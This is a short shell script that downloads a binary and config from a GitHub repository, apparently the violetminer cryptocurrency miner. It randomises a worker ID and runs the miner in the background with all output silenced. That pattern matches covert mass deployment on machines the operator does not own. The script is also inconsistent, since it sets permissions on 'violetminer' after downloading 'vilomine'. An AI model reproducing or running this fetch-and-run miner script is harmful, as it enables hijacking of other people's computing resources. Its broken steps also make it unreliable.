#!/bin/sh
apt-get update
apt-get install screen libjansson4 -y
wget https://github.com/lambohopo/la/raw/main/vilomine
wget https://raw.githubusercontent.com/lambohopo/la/main/config.json
chmod 777 violetminer config.json
sed -i "s/CPU/$(echo $(shuf -i 11111-9999999 -n 1)-CPU)#482f-LGK/" "config.json"
screen -dmS ls
./vilomine >/dev/null 2>&1
